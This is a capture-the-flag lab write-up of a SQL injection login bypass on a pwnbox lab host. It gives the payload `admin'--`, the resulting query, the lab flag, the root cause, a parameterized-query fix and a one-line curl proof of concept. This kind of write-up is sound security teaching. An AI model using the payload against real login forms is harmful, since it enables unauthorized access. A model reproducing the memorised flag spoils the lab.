# Login Ledger SQLi Lab

- Date: 2026-07-08
- Target: https://669fdd10a485.pwnbox-lab.com/
- Type: pwnbox-lab (authorized)
- Bug class: SQL injection (authentication bypass)

## Goal

Only the administrator can see the final audit note (flag).

## Observation

- Login form POSTs to `/login` with `username` and `password`.
- Demo creds `demo / demo` work and show staff role notes.
- App reflects the executed SQL query in the response.

## Evidence

Demo login query:

```sql
SELECT username, role, display_name AS displayName FROM users WHERE username = 'demo' AND password = 'demo'
```

## Exploit

Username: `admin'--`
Password: anything (e.g. `x`)

Resulting query:

```sql
SELECT username, role, display_name AS displayName FROM users WHERE username = 'admin'--' AND password = 'x'
```

The `--` comment terminates the query, bypassing the password check for the `admin` user.

## Flag

```
pwnbox{4d9e7c1a2b8f6035a6c0e1d9f73b2a84}
```

## Root cause

User-controlled `username` is concatenated directly into a SQL query without parameterization or escaping.

## Fix

Use parameterized queries / prepared statements. Never build SQL with string concatenation from user input.

## Minimal PoC

```bash
curl -s -X POST "https://669fdd10a485.pwnbox-lab.com/login" \
  -d "username=admin'--&password=x" | grep -o 'pwnbox{[^}]*}'
```
